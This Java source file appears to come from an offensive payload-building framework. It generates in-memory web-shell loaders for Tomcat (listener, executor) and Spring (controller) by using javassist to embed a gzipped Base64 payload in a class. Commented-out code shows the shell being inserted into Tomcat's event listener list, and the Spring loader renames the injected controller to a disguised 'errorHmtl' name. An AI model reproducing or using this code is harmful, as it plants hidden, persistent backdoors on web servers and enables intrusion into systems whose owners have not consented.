package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.annotation.Builder;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.Middleware;
import com.ppp.utils.maker.JavaClassUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

/**
 * @author Whoopsunix
 */
@Builder(Builder.Loader)
public class MSLoaderBuilder {
    /**
     * Tomcat
     */
    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Listener)
    public byte[] listener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
        // 目前来看这样这样似乎不好维护 javassist 语法问题还是蛮多的
//        CtMethod isInjectCtMethod = ctClass.getDeclaredMethod("isInject");
//        isInjectCtMethod.setBody("{try {\n" +
//                "    applicationEventListeners = (List) getFieldValue($1, \"applicationEventListenersList\");\n" +
//                "    for (int i = 0; i < applicationEventListeners.size(); i++) {\n" +
//                "        if (applicationEventListeners.get(i).getClass().getName().contains($2.getClass().getName())) {\n" +
//                "            return true;\n" +
//                "        }\n" +
//                "    }\n" +
//                "} catch (Exception e) {\n" +
//                "}\n" +
//                "try {\n" +
//                "    applicationEventListenersObjects = (Object[]) getFieldValue($1, \"applicationEventListenersObjects\");\n" +
//                "    for (int i = 0; i < applicationEventListenersObjects.length; i++) {\n" +
//                "        Object applicationEventListenersObject = applicationEventListenersObjects[i];\n" +
//                "        if (applicationEventListenersObject instanceof Proxy && $2 instanceof Proxy) {\n" +
//                "            Object h = getFieldValue(applicationEventListenersObject, \"h\");\n" +
//                "            Object h2 = getFieldValue($2, \"h\");\n" +
//                "            if (h.getClass().getName().contains(h2.getClass().getName())) {\n" +
//                "                return true;\n" +
//                "            }\n" +
//                "        } else {\n" +
//                "            if (applicationEventListenersObject.getClass().getName().contains($2.getClass().getName())) {\n" +
//                "                return true;\n" +
//                "            }\n" +
//                "        }\n" +
//                "    }\n" +
//                "} catch (Exception e) {\n" +
//                "}\n" +
//                "return false;}");
//
//        CtMethod ctMethod = ctClass.getDeclaredMethod("inject");
//        ctMethod.setBody("{if (applicationEventListenersObjects != null) {\n" +
//                "    Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];\n" +
//                "    System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);\n" +
//                "    newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = $2;\n" +
//                "    setFieldValue($1, \"applicationEventListenersObjects\", newApplicationEventListenersObjects);\n" +
//                "} else {\n" +
//                "    invokeMethod($1, \"addApplicationEventListener\", new Class[]{Object.class}, new Object[]{$2});\n" +
//                "}\n" +
//                "flag = new Boolean(true);}");
    }

    @Middleware(Middleware.Tomcat)
    @MemShell(MemShell.Executor)
    public byte[] executor(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }


    /**
     * Spring
     */
    @Middleware(Middleware.Spring)
    @MemShell(MemShell.Controller)
    public byte[] controller(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        StringBuilder sb = new StringBuilder();
        String name = javaClassHelper.getNAME();
        String simpleTypeName = name.substring(name.lastIndexOf(".") + 1);

        for(int i = 0; i < simpleTypeName.length(); ++i) {
            if (Character.isUpperCase(simpleTypeName.charAt(i))) {
                sb.append(simpleTypeName.charAt(i));
            }
        }

        String msName = sb.append("#").append("errorHmtl").toString();
        javaClassHelper.setNAME(msName);

        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
    }


    /**
     * 直接加载
     */
    public static byte[] defaultLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(cls));
//        classPool.importPackage("javax.servlet.http");
        classPool.importPackage("java.util");
        classPool.importPackage("java.lang.reflect");

        CtClass ctClass = classPool.getCtClass(cls.getName());

        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));

        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
        return JavaClassModifier.toBytes(ctClass);
    }

    /**
     * 直接加载
     */
//    public static CtClass defaultCtClassLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
//        ClassPool classPool = ClassPool.getDefault();
//        classPool.insertClassPath(new ClassClassPath(cls));
////        classPool.importPackage("javax.servlet.http");
//        classPool.importPackage("java.util");
//        classPool.importPackage("java.lang.reflect");
//
//        CtClass ctClass = classPool.getCtClass(cls.getName());
//
//        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
//
//        JavaClassModifier.fieldChange(cls, ctClass, javaClassHelper);
//        JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
//
//        return ctClass;
//    }
}
